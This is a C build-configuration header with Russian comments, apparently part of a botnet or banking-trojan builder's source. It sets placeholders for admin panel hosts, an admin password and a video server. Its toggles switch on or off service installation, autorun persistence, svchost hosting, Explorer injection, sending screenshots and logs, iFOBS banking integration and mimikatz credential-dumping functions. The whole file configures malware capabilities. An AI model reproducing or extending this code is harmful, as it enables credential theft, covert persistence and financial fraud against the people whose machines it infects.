#pragma once

//полная релизная версия
#include "..\builder.h"

#define ADMIN_PANEL_HOSTS MASK_ADMIN_PANEL_HOSTS
#define ADMIN_AZ MASK_ADMIN_AZ
#define USER_AZ MASK_USER_AZ
#define VIDEO_SERVER_IP MASK_VIDEO_SERVER_IP
#define FLAGS_VIDEO_SERVER MASK_FLAGS_VIDEO_SERVER
#define ADMIN_PASSWORD MASK_ADMIN_PASSWORD
#define PREFIX_NAME MASK_PREFIX_NAME
#define PERIOD_CONTACT MASK_PERIOD_CONTACT
#define MISC_STATE MASK_MISC_STATE

//настройки для отключения разных функций
//отключить установку сервиса
//#define OFF_SERVICE
//#define OFF_SDPROP
//отключить уставновку в автозапуск (в тот что в меню винды)
//#define OFF_AUTORUN
//при запуске не запускаться в свцхосте
//#define OFF_SVCHOST
//все отсылаемые данные (скриншоты, логи) ложатся в папку c:\botdebug
//#define ON_SENDDATA_FOLDER
//все плагины берутся из папки c:\plugins
//#define ON_PLUGINS_FOLDER

#define ON_VIDEOSERVER
//при работе не использовать проводник (не инжектится в него)
#define NOT_EXPLORER
//подключение ифобс
//#define ON_IFOBS
//подключение функций из программы mimikatz
#define ON_MIMIKATZ
